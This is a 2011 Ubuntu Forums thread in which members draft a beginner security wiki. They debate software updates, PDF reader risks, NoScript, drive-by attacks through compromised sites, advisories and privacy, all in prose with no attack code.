The wiki is not intended to have an application by application hardening guide associated with it, it would become cumbersome and intimidating. In my opinion this would lower it's effectiveness greatly.

---

### Post by haqking on 2011-11-13
> **vasa1 said:**
> Updating is one easy way and quite a no-brainer. The good thing going for Chrome is that its "tail" is quite short. In other words, it has fewer users who aren't on relatively newer versions. Firefox is having a problem with 3.6.x and let's not think about the Windows world with IE6.

well though i tend to agree somewhat, latest and greatest does not a secure system make either.

Everyone assumes you need the latest updates or applications.  Actuallly what you need to is to make sure any vulnerabilities in your existing software are fixed or patched or updated if you are vulnerable, an exploit and a vulnerability are not the same thing, an exploit takes advantage of a vulnerability for example.

You may not have had a vulnerability in a given system until you upgraded or updated something and now suddenly you do and so that vulnerability can be exploited.

The latest and greatest brings their own vulnerabilities which may not be known yet, or can effect other things on the system which were perfectly fine before a decision to upgrade was made ;-)

oh and also just because something has a known exploit associated with it does not mean you are vulnerable to it, it depends on your own system and the configuration of say a given service or application.

---

### Post by vasa1 on 2011-11-13
> **Dangertux said:**
> ...
The wiki is not intended to have an application by application hardening guide associated with it, it would become cumbersome and intimidating. In my opinion this would lower it's effectiveness greatly.

I'll ask [elsewhere]("http://ubuntuforums.org/showpost.php?p=11453244&postcount=1").

---

### Post by OpSecShellshock on 2011-11-13
> **vasa1 said:**
> Has anyone mentioned pdf files? Apologies if this ha been covered.

When I used Windows, I would try not to view pdf files online or even "off-line" but still connected to the 'net.

Even for off-line viewing, I'd turn off javascript ability of the pdf reader (Adobe or Foxit).

Incidentally, can one do that (turn off javascript) in Evince? I didn't see any option for that.

And here's a caution about searching for "images" (among other things):
[http://nakedsecurity.sophos.com/2011/11/12/you-practice-safe-computing-so-why-do-you-still-see-malware/](http://nakedsecurity.sophos.com/2011/11/12/you-practice-safe-computing-so-why-do-you-still-see-malware/)

For PDF viewing, my main recommendation is to disable any browser plugin that allows PDF files to be displayed in the browser. Local copies contained within their own application are always best (and if there's an apparmor profile, then all the better).

Also, don't use Adobe Reader unless the file in question is absolutely not compatible with any other. Even then, don't set it as the default for opening PDFs, disable javascript, java, the ability to access web content, embedded objects (especially Flash), and use caution with regard to where it's coming from.

I'll have to take a look at Evince, but it's possible that javascript is not even a feature in it.

Image searches: Google image search is a huge point of origin for malware. I have trouble explaining it. Basically you get results of image searches, and if you click on them it goes to another Google page where the image is in the front and its origin page loads in an iframe in the background. If the origin page happens to have malicious code on it, then it will run when you click through the image from the results page. Then it's just a matter of the malware distributors manipulating SEO in order to get their image files close to the top. This is another issue that can be mitigated with NoScript as it will (I think) prevent the background site from loading in an iframe.

EDIT: I agree with the above posts about getting too application-specific. Just had a lot of coffee. The question and responses could be moved to a new thread and I wouldn't complain.

---

### Post by Dangertux on 2011-11-13
> **vasa1 said:**
> I'll ask elsewhere.

I'm not trying to make you feel put off or anything, but this thread in some aspects has turned into a development scratch pad for the wiki I was discussing. So I assumed your question was in context of the wiki. If it wasn't I misunderstood you .

I am fairly certain that evince does not currently support javascript. This might have changed recently though I do not believe so.

---

### Post by Thewhistlingwind on 2011-11-13
> **haqking said:**
> 

The latest and greatest brings their own vulnerabilities which may not be known yet, or can effect other things on the system which were perfectly fine before a decision to upgrade was made ;-)

Well lets be reasonable here, expecting anyone to know about vulnerabilities in ALL their applications is a bit silly from a home user standpoint. I'd rather be vulnerable to the hottest exploits for which there is less code using them, rather than older exploits with more established codebases.

---

### Post by Dangertux on 2011-11-13
> **OpSecShellshock said:**
> 

Image searches: Google image search is a huge point of origin for malware. I have trouble explaining it. Basically you get results of image searches, and if you click on them it goes to another Google page where the image is in the front and its origin page loads in an iframe in the background. If the origin page happens to have malicious code on it, then it will run when you click through the image from the results page. Then it's just a matter of the malware distributors manipulating SEO in order to get their image files close to the top. This is another issue that can be mitigated with NoScript as it will (I think) prevent the background site from loading in an iframe.



  NoScript does protect you (to the best of my understanding) in the sense you are describing. If you look at the settings posted back a few pages, it will "FORBID <IFRAME>" the IFRAME loaded for the original site. The other bonus of no-script is it will also help you with click-jack and clear-click issues associated with placing an <IFRAME> over the image from the original site.

---

### Post by haqking on 2011-11-13
> **Thewhistlingwind said:**
> Well lets be reasonable here, expecting anyone to know about vulnerabilities in ALL their applications is a bit silly from a home user standpoint. I'd rather be vulnerable to the hottest exploits for which there is less code using them, rather than older exploits with more established codebases.

I agree completely, my post was purely in response to the whole exploit in chrome discussion which kind of derailed the thread a little.

My point was that exploits exist already for the whole chrome sandbox concept in certain versions so not to assume security from using chrome.

---

### Post by OpSecShellshock on 2011-11-13
> **haqking said:**
> I agree completely, my post was purely in response to the whole exploit in chrome discussion which kind of derailed the thread a little.

My point was that exploits exist already for the whole chrome sandbox concept in certain versions so not to assume security from using chrome.

I disagree. This thread has not been on a rail for quite some time :D

---

### Post by Thewhistlingwind on 2011-11-13
> **haqking said:**
> I agree completely, my post was purely in response to the whole exploit in chrome discussion which kind of derailed the thread a little.

My point was that exploits exist already for the whole chrome sandbox concept in certain versions so not to assume security from using chrome.

Honestly, if there was a /etc/hosts for buzzwords, sandbox would be in it.

---

### Post by 1clue on 2011-11-13
> **Thewhistlingwind said:**
> Well lets be reasonable here, expecting anyone to know about vulnerabilities in ALL their applications is a bit silly from a home user standpoint. I'd rather be vulnerable to the hottest exploits for which there is less code using them, rather than older exploits with more established codebases.

Not at all.

There are several organizations that publish advisories for software, all operating systems.  Either frequent the web sites or get a subscription to the list with a filter for the sort of thing that interests you.  You can get updates with very little effort about system compromises and often the best path to avoid problems.

I just did a google search on "linux advisory watch" and got all sorts of interesting stuff.  You can also add in words like "security" or "intrusion" or "vulnerability" as you wish, stir and see what comes out.

---

### Post by Dangertux on 2011-11-13
> **thewhistlingwind said:**
> honestly, if there was a /etc/hosts for buzzwords, sandbox would be in it.

+1

---

### Post by 1clue on 2011-11-13
Sorry, an addendum to my previous post.

You can also search on advisories for your main applications and get warnings for their dependencies.

---

### Post by haqking on 2011-11-13
> **Thewhistlingwind said:**
> Honestly, if there was a /etc/hosts for buzzwords, sandbox would be in it.

Tell me about it, i hate the word along with a few others thrown around all the time as security blanket concepts.

> **1clue said:**
> Not at all.

There are several organizations that publish advisories for software, all operating systems.  Either frequent the web sites or get a subscription to the list with a filter for the sort of thing that interests you.  You can get updates with very little effort about system compromises and often the best path to avoid problems.

I just did a google search on "linux advisory watch" and got all sorts of interesting stuff.  You can also add in words like "security" or "intrusion" or "vulnerability" as you wish, stir and see what comes out.



yes but the average user wont do that or understand them.

The point here is to try to educate to basic security and hopefully interest the user in making a more proactive approach to security in the future.  We are not saying you need to keep upto date with a CVE database as for the most part it will not be understood by the average user.

---

### Post by vasa1 on 2011-11-13
> **Dangertux said:**
> I'm not trying to make you feel put off or anything, but this thread in some aspects has turned into a development scratch pad for the wiki I was discussing. So I assumed your question was in context of the wiki. If it wasn't I misunderstood you .

I am fairly certain that evince does not currently support javascript. This might have changed recently though I do not believe so.

PDF files are commonly encountered and PDF file exploits rank very highly in "security" breaches from the little I know. Whether it's to be part of the wiki or not, or is too specific to be mentioned in this thread is not a call I have any right to make.

---

### Post by Dangertux on 2011-11-13
> **vasa1 said:**
> PDF files are commonly encountered and PDF file exploits rank very highly in "security" breaches from the little I know. Whether it's to be part of the wiki or not, or is too specific to be mentioned in this thread is not a call I have any right to make.

You are correct in your statement that file format exploits PDF and other types are common. As such I tried to answer your question in regards to the evince issue. As I stated evince does not currently support JavaScript. 

As far as the decision on inclusion into the thread, I disagree with you this project welcomes contributions from all members with all level of knowledge. What I think about it is what I said before in regard to mandatory access controls, as they can affect the situation you mentioned in a manner that is more related to Ubuntu itself.  Ultimately the chief editor has been Ms. Daisy as she has made most of the changes to the wiki. So we all are doing our best to make valid contributions and create a functional and informative document. 

 For any given scenario there are numerous controls you can implement part of the amazing journey into infosec is the ability to determine which controls are most effective in a certain situation. 

Hope this clarifies my stance on this

---

### Post by Ms. Daisy on 2011-11-13
> **vasa1 said:**
> PDF files are commonly encountered and PDF file exploits rank very highly in "security" breaches from the little I know. Whether it's to be part of the wiki or not, or is too specific to be mentioned in this thread is not a call I have any right to make.
Sounds like you feel pretty strongly about it, which is exactly why you have every right to add to the Wiki.  If you have the ability to summarize the issues with pdfs then I for one would love to hear it.  I'm afraid I can't personally contribute an ounce of information to it, though, because I don't know anything about pdf exploits.

---

### Post by OpSecShellshock on 2011-11-13
> **Ms. Daisy said:**
> Sounds like you feel pretty strongly about it, which is exactly why you have every right to add to the Wiki.  If you have the ability to summarize the issues with pdfs then I for one would love to hear it.  I'm afraid I can't personally contribute an ounce of information to it, though, because I don't know anything about pdf exploits.

Yeah, and that's just the thing: you don't have to know about specific exploits against specific file types in order to know that you should keep your software up to date, which is already in there.

That's why I'm totally willing to provide the best advice I can to anyone who wants to know (and will pay attention to my rambling), but think in the wiki it should be sufficient to advise users to apply security updates whenever they are available, which update manager should already be set up to do. Also, it's true that Reader and Java are the two most commonly exploited applications in terms of drive-bys on the web, but it's also true that neither of them is part of a default Ubuntu installation.

---

### Post by Ms. Daisy on 2011-11-13
> **OpSecShellshock said:**
> Yeah, and that's just the thing: you don't have to know about specific exploits against specific file types in order to know that you should keep your software up to date, which is already in there.

That's why I'm totally willing to provide the best advice I can to anyone who wants to know (and will pay attention to my rambling), but think in the wiki it should be sufficient to advise users to apply security updates whenever they are available, which update manager should already be set up to do. Also, it's true that Reader and Java are the two most commonly exploited applications in terms of drive-bys on the web, but it's also true that neither of them is part of a default Ubuntu installation.I've come to realize that the people that say "Linux is secure" say so because there aren't any viruses in the wild.  And that's where they stop thinking about security.  I tried to add a bit in the Linux Vulnerabilities & the Browser sections to convince people that there are other vectors far more likely to get them cracked.  Maybe what we could add is a few sentences relating to WHY Reader & Java will get you.  Or maybe an example of the typical kind of site that could get you. Is it strictly the seedier side of the web, or is it a decent percentage of legit sites that have been compromised? Something aimed at getting people to even realize that those are real threats in the first place.  The solution would then be to implement the stuff we ramble on about in the Wiki.

What does everyone else think of this?

---

### Post by Dangertux on 2011-11-13
> **Ms. Daisy said:**
> I've come to realize that the people that say "Linux is secure" say so because there aren't any viruses in the wild.  And that's where they stop thinking about security.  I tried to add a bit in the Linux Vulnerabilities & the Browser sections to convince people that there are other vectors far more likely to get them cracked.  Maybe what we could add is a few sentences relating to WHY Reader & Java will get you.  Or maybe an example of the typical kind of site that could get you. Is it strictly the seedier side of the web, or is it a decent percentage of legit sites that have been compromised? Something aimed at getting people to even realize that those are real threats in the first place.  The solution would then be to implement the stuff we ramble on about in the Wiki.

What does everyone else think of this?


I think its a good idea. However, there is a problem. We've in the past only talked about single vulnerabilities however attackers are clever and string together different vulnerabilities. For instance, a completely legitimate site could be compromised allowing an attacker to inject an iframe that runs a javascript that executes a browser based exploit against the visitor of the site. If it is successful the exploit's payload drops files to the compromised machine, which then phone home and download more malicious content.

So its really hard to say, "stay out of that neighborhood" in regard to this. Thus it would basically have a glossary (I believe that is the term haqking used earlier) to define all the types of attack vectors possible and how you can come in contact with them.

---

### Post by Ms. Daisy on 2011-11-13
> **Dangertux said:**
> I think its a good idea. However, there is a problem. We've in the past only talked about single vulnerabilities however attackers are clever and string together different vulnerabilities. For instance, **a completely legitimate site could be compromised **allowing an attacker to inject an iframe that runs a javascript that executes a browser based exploit against the visitor of the site. If it is successful the exploit's payload drops files to the compromised machine, which then phone home and download more malicious content.The bit in bold is what I was getting at.  I've heard a lot of the "Linux is invincible" crowd say that they don't go to the bad sites therefore they're fine. I guess I'm just ](*,) by trying to convince the world to give a crap.  That's not Ubuntu-specific anyway, plus the "Linux is invincible" folks aren't going to read the Wiki to begin with!

Sorry, I went around the bend there for a minute (insert smiley wearing straight-jacket).  I'm back now. I'm thinking we put DT's Noscript discussion in the second section of the Wiki if for no other reason than it would make the basic part too long. In fact I'm going to put up a big stinking fight to keep anything else out of the "basic" part.  If it's too long we'll lose the true new users. I don't have a problem with putting more into the "next step" section (or whatever we're calling the second part).  So what else do we need in there for OSSS, Haqking & DT to buy off on the whole thing?

---

### Post by OpSecShellshock on 2011-11-13
So here's the thing. It could be any site, for any number of reasons, and it's really hard to predict and/or prepare for. Just going off of things I've seen recently, there's malicious advertisements, poor web application implementation that allows script injections, remote file inclusions (do a Google search on "timthumb" and restrict results to the last month*), PHPBB exploits, likely FTP credential compromise... well it doesn't really stop. This happens on otherwise perfectly harmless sites. And when it's advertisements, it's the top ad platforms where it tends to happen, and they have placements on very popular sites. As I said, it can't be predicted. That's why I recommend blocking everything up front and then allowing scripts selectively as needed. The user of the browser has no control over how on top of things the administrators of a given site are.

And if by any of the mechanisms above a browser gets directed to exploits, it's going to have a whole cocktail thrown at it in an imperceptibly short time. Best most of us can manage is to make sure the initial script doesn't run. If it does, then we can hope that the affected applications are either fully patched or not installed.

*EDIT: to be specific, I'm suggesting you look for articles/posts *about* it, not that you look for URLs that contain it. Don't do that.

---

### Post by 1clue on 2011-11-13
I know that there exist security advisories phrased such that only a low-order nerd could understand them.  There may be some that can be understood by a non-nerd.  I don't fit in either category, so I'm hooked up to a high-order nerd list.

Even if you don't understand the nuts and bolts of it, you can tell when it says "Firefox" that it has something to do with your web browser.

Can't remember if it's this distro or some other, there used to be a tool that would check for advisories for the software you had installed on that system.

---

### Post by Dangertux on 2011-11-13
> **1clue said:**
> I know that there exist security advisories phrased such that only a low-order nerd could understand them.  There may be some that can be understood by a non-nerd.  I don't fit in either category, so I'm hooked up to a high-order nerd list.

Even if you don't understand the nuts and bolts of it, you can tell when it says "Firefox" that it has something to do with your web browser.

Can't remember if it's this distro or some other, there used to be a tool that would check for advisories for the software you had installed on that system.

The advisories on CERT are pretty much plain English for anyone who is interested [http://www.us-cert.gov/cas/techalerts/index.html](http://www.us-cert.gov/cas/techalerts/index.html)

As far as advisories based on what you have installed I know things like Nessus and OpenVAS do that, but that's getting into non new guy territory really quick. I know of Belarc advisor but that is a Windows thing. I believe that YaST in SuSE may do something along those lines as well. Truely though it's not necessary and if you're using Ubuntu repositories you may have problems equating advisories to your versions. Often times in Ubuntu and other distros patches will be back ported. Meaning they will be applied in an update but will not necessarily change the version of the application. So this leads to more confusion. 

I really think that focusing on keeping the system updated is crucial. While confusing people with advisories and Mitre CVE's will just muddy the issue.

---

### Post by OpSecShellshock on 2011-11-13
The [USN]("http://www.ubuntu.com/usn/") page has a feed that can be used to keep track of available security updates and what the updated packages will be called.

---

### Post by Dangertux on 2011-11-13
> **OpSecShellshock said:**
> The [USN]("http://www.ubuntu.com/usn/") page has a feed that can be used to keep track of available security updates and what the updated packages will be called.

That's a good one too. Am I the only one who feels like we're going in circles :-P

---

### Post by haqking on 2011-11-13
> **Dangertux said:**
> That's a good one too. Am I the only one who feels like we're going in circles :-P

I remember at some point a mention of a Wiki for beginners in newb terms ;-)

Not sure when or where that was though....LOL

---

### Post by Ms. Daisy on 2011-11-13
> **Dangertux]Am I the only one who feels like we're going in circles :P[/QUOTE]
Nope. I'm pretty dizzy right now.  said:**
> I think it looks pretty good so far there were a couple of things I think need expounded on a little bit. The browser security section being a big one. Possibly some sample configs or walkthroughs don't know if anyone has a link to some but I can work with that if need be.

also the answer to this question

No it's not true. It's just as likely to execute, however what it has access to changes dramatically if it has lowered privileges.

I think there are a few things about sudo that need to be expounded on a little I will elaborate later as I have some things to take care of (food) atm.

Otherwise its looking good. So I fixed the question you answered. Done.
DT added the browser security section, is that as beefy as you want it? Done?
And what do you want to say about sudo?

To quote my favorite Simpson's episode:
> Are we there yet?
no
Are we there yet?
no
Are we there yet?
NOOOO!!!!!!

---

### Post by jramshu on 2011-11-13
IMHO I think it looks pretty good. The basics with a little intermediate in there. I'm sure more can and will be added. 

Hiding files in various image formats is pretty common, as already mentioned. It's called steganography, and is quite interesting. If a file is inside an image, sometimes you can open it in a text editor and somewhere in all the encrypted stuff you will see a file, figuring out how to open it and take it apart is a different story. They are getting better and better at hiding them. Usually targeted at windows.

So when does the server section start? lol

---

### Post by Dangertux on 2011-11-13
> **Ms. Daisy said:**
> Nope. I'm pretty dizzy right now. ;) So I fixed the question you answered. Done.
DT added the browser security section, is that as beefy as you want it? Done?
And what do you want to say about sudo?

To quote my favorite Simpson's episode:


You know...I had a whole rant typed out in another tab...But I really just don't think there is any point, it will just start another unrecoverable linux is secure debate.

Sudo...There is a lot to say about it... I'll say something clever about it when my mind is coherent lol.

Did you ever decide if you wanted me to move that NoScript thing to the wiki, or I can post it on my website and you can link externally to it. Just let me know it's up to you.

I dunno, honestly I'm kinda bummed right now.

---

### Post by MrLeek on 2011-11-15
Rumours of my demise have been greatly exaggerated...

Apologies to all for my absence - been tied down with other stuff that's taking a lot of time to resolve.  

Really like the direction the wiki page has taken at a first skim read - I'm going to read that in depth before I try to catch up with the goings on in the thread. I'll then document my thoughts (assuming that they are welcomed of course! :D)

---

### Post by Dangertux on 2011-11-15
> **MrLeek said:**
> Rumours of my demise have been greatly exaggerated...

Apologies to all for my absence - been tied down with other stuff that's taking a lot of time to resolve.  

Really like the direction the wiki page has taken at a first skim read - I'm going to read that in depth before I try to catch up with the goings on in the thread. I'll then document my thoughts (assuming that they are welcomed of course! :D)

Of course your thoughts are welcome :-P

I was going to try to work some on this today as well, I've been a little busy/out of it lately, but as promised I'll do something with the sudo stuff.

---

### Post by Ms. Daisy on 2011-11-15
> **MrLeek said:**
> Rumours of my demise have been greatly exaggerated...

Apologies to all for my absence - been tied down with other stuff that's taking a lot of time to resolve.  

Really like the direction the wiki page has taken at a first skim read - I'm going to read that in depth before I try to catch up with the goings on in the thread. I'll then document my thoughts (assuming that they are welcomed of course! :D)
Glad to hear you're still around, MrTwain. I'm anxious to hear what you both have to say.

---

### Post by OpSecShellshock on 2011-11-15
> **Ms. Daisy said:**
> Glad to hear you're still around, MrTwain. I'm anxious to hear what you both have to say.

I glanced at it yesterday but at the time couldn't muster up anything more coherent than "wiki gooooooood." Shaping up to be an exhausting week for me!

---

### Post by Ms. Daisy on 2011-11-15
Sounds like everyone is having a rough week. Perhaps when everyone has had a nice rest we can visit NoScript again. It seems that we have not convinced the masses of the need for it. Based on a few comments I've seen and on some more input from Mystery Guy, NoScript makes browsing a pain. People don't seem to like needing to whitelist each site or to temporarily allow from some pages. And we haven't provided enough reason to slog through the process in the first place.

Here's Mystery Guy's comment: > Still don't like the noscript stuff. Having looked at the banks' advice on security they make no mention of that. Interestingly, a lot require flash and javascript to work correctly. Also, Mircosoft doesn't make a big song and dance of disabling javascript.
I did a little more research and found the following discussion on the NoScript FAQ page:
>  [JavaScript]("http://en.wikipedia.org/wiki/JavaScript"), [Java]("http://en.wikipedia.org/wiki/Java") and [Flash]("http://en.wikipedia.org/wiki/Adobe_Flash"), even being very different technologies, have one thing in common: they execute on your computer code coming from a remote site. 
All the three implement some kind of sandbox model, limiting the activities remote code can perform: e.g., sandboxed code shouldn't read/write your local hard disk nor interact with the underlying operating system or external applications. 
Even if the sandboxes were bullet proof (not the case, read below) and even if you or your operating system wrap the whole browser with another sandbox (e.g. IE7+ on Vista or Sandboxie), the mere ability of running sandboxed code **inside** the browser can be exploited for malicious purposes, e.g. to steal important information you store or enter on the web (credit card numbers, email credentials and so on) or to "impersonate" you, e.g. in fake financial transactions, launching "cloud" attacks like [Cross Site Scripting (XSS)]("http://noscript.net/features/#xss") or CSRF, with no need for escaping your browser or gaining privileges higher than a normal web page. This alone is enough reason to allow scripting on trusted sites only. 
Moreover, many security exploits are aimed to achieve a "privilege escalation", i.e. exploiting an implementation error of the sandbox to acquire greater privileges and perform nasty task like installing trojans, rootkits and keyloggers. 
...
The most effective way is disabling the potential threat on untrusted sites. What can you add to this discussion?  Maybe someone has a plain English example of the problem?

---

### Post by Dangertux on 2011-11-15
> **Ms. Daisy said:**
> Sounds like everyone is having a rough week. Perhaps when everyone has had a nice rest we can visit NoScript again. It seems that we have not convinced the masses of the need for it. Based on a few comments I've seen and on some more input from Mystery Guy, NoScript makes browsing a pain. People don't seem to like needing to whitelist each site or to temporarily allow from some pages. And we haven't provided enough reason to slog through the process in the first place.

Here's Mystery Guy's comment: 
I did a little more research and found the following discussion on the NoScript FAQ page:
 What can you add to this discussion?  Maybe someone has a plain English example of the problem?


Ok... Pretty much what NoScript's site said is accurate.  Flash and Javascript are both vehicles for client side code execution. Meaning it's happening on your machine. If for some reason, your browser, or flash player is vulnerable in some way, and doesn't do the necessary checking up on what these guys are doing, the code executed on your machine may not necessarily do very nice things.

Your bank may or may not necessarily say something about it. They are concerned with FIPS compliance as well as multiple others, which means the security of their site, and their connection to you, as well as the security and privacy of your data on their systems. They are held to a much higher standard of security than say ubuntuforums.org (which likely doesn't have a compliance standard it needs to follow, if they follow one its voluntary). What this means, is your bank is not going to have malicious code running on their site, and the odds of their site being compromised are not nearly as high as that of a site like this, or twitter. So they're doing the risk management for you in a sense. Besides, if there were a chance that they could be compromised, would they tell you while they're holding your money?

That being said, if Ubuntuforums for instance was compromised, and manipulated in such a manner to exploit a vulnerability in Firefox 3.6.x For linux (which comes by default with Ubuntu 10.04, and it stands to reason that alot of this site's visitors might be using Ubuntu 10.04) you could be in danger of having your browser compromised thus your machine. At which point the data on your machine, and between your machine and your bank or whatever trusted site is still in jeopardy, because it is not in the hand's of that third party site yet they can no longer guarantee the security of that data.

So in my opinion NoScript is a very good idea, and I probably didn't explain this very well, but basically what I'm saying is, if a site you visit gets owned, the attacker's of that site will likely add code to it, to attempt to compromise its visitors. I used ubuntuforums as an example, because we're on it, and its an easy target, as it can be safely assumed that alot of people who visit this site will likely be running a default Ubuntu configuration. 

Hope that helps.

---

### Post by Thewhistlingwind on 2011-11-15
> **Dangertux said:**
> 
So in my opinion NoScript is a very good idea, and I probably didn't explain this very well, but basically what I'm saying is, if a site you visit gets owned, the attacker's of that site will likely add code to it, to attempt to compromise its visitors. I used ubuntuforums as an example, because we're on it, and its an easy target, as it can be safely assumed that alot of people who visit this site will likely be running a default Ubuntu configuration. 

Hope that helps.

There is that, theres also the whole "trust" issue again. Because these technologies are essentially easy ways to get _*REMOTE CODE*_ executing on your system, you have to bring in many of the same questions you ask when you install a piece of software. (Just not quite as extreme a case.) "Do I trust this vendor? How important is it to me that I run this script?" etc etc.

The whole point of noscript is to make it easy for you to make sure your able to ask these questions every time a script is run, without having to compromise all non-HTML 4 content.

---

### Post by Ms. Daisy on 2011-11-16
[SIZE=2]You both make good points. Some more info I found is  maybe a bit more concise [/SIZE][SIZE=2]and perhaps more  convincing [/SIZE][SIZE=2]than the NoScript FAQ. This is from [http://www.cert.org/tech_tips/securing_browser/#why:](http://www.cert.org/tech_tips/securing_browser/#why:)  > Web page addresses can be disguised or take you to an unexpected  site. Many users are unwilling to enable or disable functionality as  required to secure their web browser. As a result, exploiting  vulnerabilities in web browsers has become a popular way for attackers  to compromise computer systems.  Maybe I'll lift that quote  & drop it right in the Wiki.

I'd really like to hear from the unconvinced on that.  Why wouldn't you  secure your browser after knowing it's one of the most popular ways to  get cracked?  There are probably very few ubuntu forum members clicking  on any old dodgy site because we're all smarter than that.  But we all  have to research stuff on google/bing/search-engine-of-choice from time  to time. And you're researching it because you don't know about it, therefore,  how can you know that any of those sites are good ones? 
[/SIZE]

---

### Post by Dangertux on 2011-11-16
I think there is another point to think about here. We're not selling security. We can explain the benefits and the procedures, but ultimately if people choose not to care, that's their choice. After all Linux is about freedom. So they are free to compromise their data if they choose.

---

### Post by CharlesA on 2011-11-16
> **Dangertux said:**
> I think there is another point to think about here. We're not selling security. We can explain the benefits and the procedures, but ultimately if people choose not to care, that's their choice. After all Linux is about freedom. So they are free to compromise their data if they choose.

+1. All you can do is give them the tools. Can't exactly force them to use it.

---

### Post by Ms. Daisy on 2011-11-16
> **Dangertux said:**
> I think there is another point to think about here. We're not selling security. We can explain the benefits and the procedures, but ultimately if people choose not to care, that's their choice. After all Linux is about freedom. So they are free to compromise their data if they choose.Point well taken.  But with the title on the Wiki as "Basic Security", we have a duty to at least present the facts completely.  It is totally the user's choice to ignore our advice, many will I'm sure. But it's another thing to have someone decide not to secure it just because we didn't make a good case for it.

---

### Post by OpSecShellshock on 2011-11-16
> **Ms. Daisy said:**
> Point well taken.  But with the title on the Wiki as "Basic Security", we have a duty to at least present the facts completely.  It is totally the user's choice to ignore our advice, many will I'm sure. But it's another thing to have someone decide not to secure it just because we didn't make a good case for it.

Right, and the fact is, scripts and objects will all run in the browser immediately and automatically unless the user tells them not to, whether they're good or bad. The browser doesn't judge. But the user doesn't really have a way of knowing ahead of time which is which.

---

### Post by Soul-Sing on 2011-11-16
Lets try gnash instead of flash. Flash= malware.
Gnash works here: youtube/etc. (11.04)

---

### Post by vanhenryjr on 2011-11-16
To answer the question of "why don't you newbies embrace no script" since it is known that crackers may use this avenue I will give my answer. But to understand you must think like a newbie-and I would argue that almost all posting on this thread are intermediate or advanced users.

1. If I wanted 100% secure I would not use the internet at all. Those people obviously are not posting or reading here:)
2. There are so many "allow" options on even a trusted homepage that it is very confusing. 
3. I want my internet experience to work-when I use no script all I get are "work arounds" not function. I want to read the message boards of my hobbies, read a few online newspapers, check the weather, learn something, buy some music, do a few banking chores. I am not out looking at porn, gambling, hacking/cracking websites and other "risky behavior". 

I hope my current set up is secure enough. I am not a business, I am just a user. I still think crackers cannot hit EVERY computer out there and my linux system is a little more esoteric than most. I also know that whatever I do, unless I remove my computer from the internet, that there is still a risk to my system. IMO I gain little by dropping my risk from 0.001% to 0.0000001% but lose 90% functionality (all "made up" numbers).

---

### Post by CharlesA on 2011-11-16
> **leoquant said:**
> Lets try gnash instead of flash. Flash= malware.
Gnash works here: youtube/etc. (11.04)

How is Flash malware? I know of LSO (which can be deleted) and flash exploits, which can have their damage limited by Apparmor/SElinux.

> **vanhenryjr said:**
> 
I hope my current set up is secure enough. I am not a business, I am just a user. I still think crackers cannot hit EVERY computer out there and my linux system is a little more esoteric than most. I also know that whatever I do, unless I remove my computer from the internet, that there is still a risk to my system. IMO I gain little by dropping my risk from 0.001% to 0.0000001% but lose 90% functionality (all "made up" numbers).

This. I don't use noscript, but I watch what sites I visit and to be honest, I don't usually "surf" the interwebz much any more. I'd be more concerned about XSS, but I am not quite sure there is a way to detect or prevent it outside of not allowing javascript to run.

---

### Post by Dangertux on 2011-11-16
> **vanhenryjr said:**
> To answer the question of "why don't you newbies embrace no script" since it is known that crackers may use this avenue I will give my answer. But to understand you must think like a newbie-and I would argue that almost all posting on this thread are intermediate or advanced users.

1. If I wanted 100% secure I would not use the internet at all. Those people obviously are not posting or reading here:)
2. There are so many "allow" options on even a trusted homepage that it is very confusing. 
**3. I want my internet experience to work-when I use no script all I get are "work arounds" not function. I want to read the message boards of my hobbies, read a few online newspapers, check the weather, learn something, buy some music, do a few banking chores. I am not out looking at porn, gambling, hacking/cracking websites and other "risky behavior".** 

I hope my current set up is secure enough. I am not a business, I am just a user. I still think crackers cannot hit EVERY computer out there and my linux system is a little more esoteric than most. I also know that whatever I do, unless I remove my computer from the internet, that there is still a risk to my system. IMO I gain little by dropping my risk from 0.001% to 0.0000001% but lose 90% functionality (all "made up" numbers).


There is something here that I want to emphasize, and while I completely understand your logic and thinking. A huge misconception that spawned in the early to mid 90's is that you have to be visiting a malicious site, this is simply not the case anymore. 

As the websites you visit, become more complex trying to offer us all the rich exciting content we demand, they become gigantic monsters of code. Code which is not always written to the best standard, code that can be exploited by a malicious user to load malicious code from an external source (This is called cross site scripting). So when you load up your favorite social network someone in fact could have posted a comment on your status that loads malicious code as soon as the page loads. NoScript is helpful here as it will protect you. It's not always a trust issue. For those who say this doesn't happen to major sites, as I wrote this I thought back to an incident in july where this happened to hundreds of thousands of twitter users. 

@Ms. Daisy : We do owe them the truth, but we can't expect them to heed it. This quote comes to mind "I can explain it to you, but I can't understand it for you."

@leoquant : Using gnash as opposed to flash is security through obscurity. Nothing prevents anybody from targeting gnash as opposed to flash for an exploit. The risk is reduced as obviously gnash is not as popular, that being said, security by obscurity is not in-line with best practices and tends to muddy the issue. It has its purpose and to an extent the argument is valid. However, for the new user it would be best imho to give them tangible quantifiable security measures. Now if you like gnash because you're a proprietor of open source software, than by all means use it. However, open source software is not a security feature, it's just easier to reverse engineer.

---

### Post by SparTacux on 2011-11-16
> **CharlesA said:**
> Just because someone could get or has certain information, doesn't make them a "hacker."

I don't have access to the web or db server, so how would I know what OS or browser you are using?

I think the guy made an interesting point though.
Some forum moderators"could" have access your  IP's , your cookies , etc. 

Maybe the wiki Ubuntu Basic Security write up should inculde stuff about protecting your privacy and identity as well. This might include simple things like deleting your Browser cookies, cache,  hiding your browser type.  Maybe don't create a user account with your exact name, etc. Then there are tracking programs on many sites watching all your clicks on the subjects you find interesting.  Maybe give details and reasons for using proxies, etc. Some of the things you do and say could attract hackers/crackers. 

I probably going off course and this might come under Privacy but maybe there are some Ubuntu Specifics on this topic. Just a thought.

---

### Post by Dangertux on 2011-11-16
> **SparTacux said:**
> I think the guy made an interesting point though.
Some forum moderators"could" have access your  IP's , your cookies , etc. 

Maybe the wiki Ubuntu Basic Security write up should inculde stuff about protecting your privacy and identity as well. This might include simple things like deleting your Browser cookies, cache,  hiding your browser type.  Maybe don't create a user account with your exact name, etc. Then there are tracking programs on many sites watching all your clicks on the subjects you find interesting.  Maybe give details and reasons for using proxies, etc. Some of the things you do and say could attract hackers/crackers. 

I probably going off course and this might come under Privacy but maybe there are some Ubuntu Specifics on this topic. Just a thought.

Security and privacy are not the same thing. A moderator could have access to your public IP. However, the other day when I was in IRC someone mentioned my public IP was being displayed when I logged in. I will say the same thing here as I said there.

Just because you have access to a public IP does not mean you can do anything with it. Which ultimately is the point of this guide imo. It's to help users configure their system so that it is not overtly vulnerable. The ipv4 address space is 32 bits, which means there are approximately 4.2 billion unique IP addresses. Scanning all of them would take a long time however is still feasible. So an IP address is not truly private. 

